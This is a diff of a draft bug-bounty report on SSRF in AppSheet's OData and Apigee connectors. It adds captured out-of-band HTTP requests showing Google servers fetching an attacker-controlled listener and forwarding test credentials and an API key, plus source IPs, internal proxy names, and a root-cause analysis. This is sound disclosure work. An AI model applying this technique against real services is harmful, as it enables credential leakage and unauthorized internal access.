@@ -45,8 +45,9 @@ At least four independent instances of the same root cause are now documented:
 |---|-----------|-------------|--------|
 | 1 | Workflows/Bots "Run a webhook" | webhook executor | Fixed 2021 (Nechuta report, ~$6,267) |
 | 2 | Apigee account-source connector, prior code path | Apigee connector client | Fixed (separate VRP report, bughunters.google.com/reports/vrp/PnwRwydmr) |
-| 3 | **OData data connector** | `Microsoft.OData.Client` (v2 and v4) | **Confirmed open — this report, Surface 1** |
-| 4 | **Apigee API connector, OpenAPI Spec URL code path** | distinct HTTP client (not OData) | **Confirmed open — this report, Surface 2** |
+| 3 | **OData data connector v3/v4** | `Microsoft.OData.Client` | **Confirmed open — this report, Surface 1** |
+| 4 | **OData data connector v2** | `Microsoft.Data.Services.Client` (distinct .NET library) | **Confirmed open — this report, Surface 1 (v2 variant)** |
+| 5 | **Apigee API connector, OpenAPI Spec URL code path** | Apigee connector client (Cache-Control: no-cache, via Squid) | **Confirmed open — this report, Surface 2** |
 
 Items 3 and 4 were confirmed in the same testing session on 2026-06-16, using the same
 OOB listener, from two distinct GCP fleet IPs. Both surfaces were independently
@@ -206,26 +207,96 @@ Via: 1.1 squid-proxy-open-api-us-west1-sqws (squid)
   infrastructure, and (b) leaks internal naming and routing topology to any
   attacker-controlled server.
 
+### Pre-submission reconfirmation — 2026-06-19 (day of submission)
+
+OOB listener: `d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro`
+
+**OData v4.0 (10:58:10 UTC) — `Microsoft.OData.Client`:**
+```http
+GET /$metadata HTTP/1.1
+Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
+Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
+Accept-Encoding: gzip, deflate
+Authorization: Basic VGVzdGVyIDpUZXN0ZXIxMjM0
+Traceparent: 00-d2a9be08c98474342ee9244087048204-e4e7c7e59764512e-00
+```
+- Source IP: `35.185.223.113` (GCP, AS15169)
+- `VGVzdGVyIDpUZXN0ZXIxMjM0` decodes to `Tester :Tester1234` — credentials forwarded verbatim with no sanitization (note: even malformed username with leading space is passed through)
+- UI error: "None of the supported type(s) 'Microsoft.OData.ODataMediaType, Microsoft.OData.ODataMediaType' matches the content type 'text/html; charset=utf-8'"
+
+**OData v3.0 (10:59:25 UTC) — `Microsoft.OData.Client`:**
+```http
+GET /$metadata HTTP/1.1
+Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
+Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
+Accept-Encoding: gzip, deflate
+Authorization: Basic VGVzdGVyOlRlc3RlcjEyMzQ=
+Traceparent: 00-8e15b2e372a2dff3d0bbd6a71425c7c9-dc873a389c7c528e-00
+```
+- Source IP: `35.185.223.113` (GCP, same fleet node as v4 test)
+- OData v3 and v4 share the same `Microsoft.OData.Client` library
+
+**OData v2.0 (10:59:45 + 10:59:54 UTC) — `Microsoft.Data.Services.Client` (DIFFERENT HTTP client):**
+```http
+GET /$metadata HTTP/1.1
+Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
+Accept-Encoding: gzip, deflate
+Authorization: Basic VGVzdGVyOlRlc3RlcjEyMzQ=
+Traceparent: 00-769bd8f577803f62e9441a2a331ac571-5292dec86d0df123-00
+```
+- Source IPs: `35.185.223.113` at 10:59:45 + `35.203.182.241` at 10:59:54 (two separate GCP fleet nodes, load-balanced)
+- OData v2 uses `Microsoft.Data.Services.Client` — a **different** .NET library from the v3/v4 client, confirmed by the absence of the OData-specific `Accept` header. Both clients independently make unfiltered server-side fetches and forward `Authorization: Basic` verbatim.
+- `VGVzdGVyOlRlc3RlcjEyMzQ=` decodes to `Tester:Tester1234`
+
+**Apigee OpenAPI Spec (11:01:35 UTC):**
+```http
+GET / HTTP/1.1
+Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
+Accept-Encoding: gzip, deflate
+Cache-Control: no-cache
+Traceparent: 00-6c735cdb7f16ea957f7ade6bc734581d-0a9421011552a4fd-00
+X-Apikey: ApiKey012345678901234567890
+```
+- Source IP: `8.231.222.130` (GCP via internal Squid proxy — same proxy path as 2026-06-18 session)
+- `X-Apikey: ApiKey012345678901234567890` forwarded verbatim
+- UI error reflected the full HTML body: `'<html><head></head><body>jcxhrfhftbjxd0r7nt46j78r9629vhq8d</body></html>' is not supported`
+
+**Session summary (2026-06-19):** All surfaces confirmed live as of today. Three independent HTTP client implementations confirmed fetching attacker-controlled URLs:
+1. `Microsoft.OData.Client` — OData v3 and v4 (sends OData Accept header)
+2. `Microsoft.Data.Services.Client` — OData v2 (different .NET library, no OData Accept header; hit from two GCP fleet nodes simultaneously)
+3. Apigee connector client — OpenAPI Spec URL path (Cache-Control: no-cache, routes via Squid proxy)
+
 ### Additional OData evidence from prior sessions
 
-The OData connector SSRF has been confirmed independently on four separate dates:
+The OData connector SSRF has been confirmed independently on five separate dates:
 - 2026-06-15 20:03 UTC — GCP IP `35.203.182.241`, creds `testuser:testpass1234`
 - 2026-06-16 11:43 UTC — GCP IP `35.247.115.29` (independent re-verification, different session)
 - 2026-06-16 20:56 UTC — GCP IP `35.203.182.241`, creds `canary:canary`
-- **2026-06-17 12:52 UTC — GCP IP `34.82.138.241`, creds `Tester:Tester` (pre-submission re-verification)**
+- 2026-06-17 12:52 UTC — GCP IP `34.82.138.241`, creds `Tester:Tester`
+- **2026-06-19 10:58–10:59 UTC — GCP IPs `35.185.223.113` + `35.203.182.241`, all three OData versions confirmed (same-day pre-submission reconfirmation)**
 
 ---
 
 ## ROOT CAUSE
 
-AppSheet's connector framework has no shared, centralized outbound HTTP client. Each
-connector type (`Microsoft.OData.Client`, the Apigee connector client, the webhook
-executor, etc.) independently implements its own HTTP fetching with no shared
-IP-range blocklist, no shared credential-forwarding policy, and no shared
-response-reflection policy. Prior fixes (2021 webhook, prior Apigee account-source
-code path) were applied as point-fixes to the specific code paths that were reported —
-no generalized control was introduced. As a result, each new or unreviewed connector
-type is, by default, a fresh instance of the same SSRF root cause.
+AppSheet's connector framework has no shared, centralized outbound HTTP client. Testing
+confirms **at least three independent HTTP client implementations** all making unfiltered
+GCP-origin server-side fetches:
+
+| Client library | Connector version | Fingerprint |
+|---|---|---|
+| `Microsoft.OData.Client` | OData v3, v4 | `Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8` |
+| `Microsoft.Data.Services.Client` | OData v2 | `Accept-Encoding: gzip, deflate` only (no OData-specific Accept) |
+| Apigee connector client | Apigee → OpenAPI Spec URL | `Cache-Control: no-cache`; routes via internal Squid proxy |
+
+Each client independently lacks SSRF protection: no shared IP-range blocklist, no shared
+credential-forwarding policy, no shared response-reflection policy. Prior fixes (2021
+webhook, prior Apigee account-source code path) were applied as point-fixes to the
+specific code paths that were reported — no generalized control was introduced. As a
+result, each new or unreviewed connector type is, by default, a fresh instance of the
+same SSRF root cause. The OData v2 client hitting two separate load-balanced GCP fleet
+nodes simultaneously further confirms this is live production infrastructure, not a test
+environment.
 
 ---
 
@@ -388,7 +459,7 @@ a different bug class (CWE-502), not SSRF — noted as context only.
 ---
 
 *Reporter: azmolhaque95@gmail.com*
-*Report date: 2026-06-17 (original discovery 2026-06-16; re-verified 2026-06-17 pre-submission)*
+*Report date: 2026-06-19 (original discovery 2026-06-16; re-verified 2026-06-17 and 2026-06-19 pre-submission)*
 *Submit at: https://bughunters.google.com/report → Google VRP → AppSheet (`appsheet.com`)*
 
 ---
